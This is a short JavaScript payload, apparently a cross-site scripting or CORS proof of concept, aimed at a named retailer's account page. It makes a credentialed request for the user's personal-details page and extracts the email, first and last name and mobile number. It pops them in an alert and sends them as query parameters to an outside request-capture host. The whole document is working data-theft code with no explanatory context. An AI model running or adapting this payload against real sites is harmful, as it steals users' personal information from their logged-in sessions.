function DOM_nunce() {
  xhr2 = new XMLHttpRequest();
  xhr2.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      const parser = new DOMParser();
      const doc = parser.parseFromString(this.responseText, "text/html");
      const input = doc.querySelector(".js-profile-email").textContent;
      const input2 = doc.querySelector(".js-profile-firstName").textContent;
      const input3 = doc.querySelector(".js-profile-lastName").textContent;
      const input4 = doc.querySelector(".js-profile-mobile").textContent;
      alert(`email: ${input}
        First Name:  ${input2}
        Last Name:  ${input3}
        Mobile:  ${input4}`);

      fetch(
        `https://www.postb.in/1771710070988-3939558065030/?q=${input}&q=${input2}&q=${input3}&q=${input4}`,
        {
          method: "GET",
          headers: {
            "X-Status": "Awesome",
          },
        }
      );
    }
  };

  xhr2.open("GET", "https://www.bose.com/account?tab=personalDetails");
  xhr2.withCredentials = true;
  xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr2.send();
}
DOM_nunce();
